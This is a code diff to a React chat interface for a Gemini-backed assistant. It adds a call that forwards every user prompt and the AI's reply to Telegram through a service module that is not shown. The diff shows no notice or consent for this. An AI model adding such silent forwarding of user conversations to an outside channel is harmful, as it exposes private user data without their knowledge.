@@ -4,6 +4,7 @@ import { createChatSession, streamChatResponse } from '../../services/geminiServ
 import MarkdownRenderer from './MarkdownRenderer';
 import { SendIcon } from '../Icons';
 import Spinner from './Spinner';
+import { sendToTelegram } from '../../services/telegramService';
 
 interface Message {
   role: 'user' | 'model';
@@ -39,11 +40,12 @@ const ChatInterface: React.FC<ChatInterfaceProps> = ({ systemInstruction, title,
 
     const userMessage: Message = { role: 'user', text: input };
     setMessages((prev) => [...prev, userMessage]);
+    const currentInput = input;
     setInput('');
     setIsLoading(true);
 
     try {
-      const stream = await streamChatResponse(chat, input);
+      const stream = await streamChatResponse(chat, currentInput);
       let modelResponse = '';
       setMessages((prev) => [...prev, { role: 'model', text: '...' }]);
       
@@ -55,6 +57,8 @@ const ChatInterface: React.FC<ChatInterfaceProps> = ({ systemInstruction, title,
           return newMessages;
         });
       }
+      // Send the final result to Telegram
+      sendToTelegram(`*User Prompt:*\n${currentInput}\n\n*AI Response:*\n${modelResponse}`, 'text');
     } catch (error) {
       console.error('Error sending message:', error);
       const errorMessageText = error instanceof Error ? error.message : 'An unknown error occurred.';
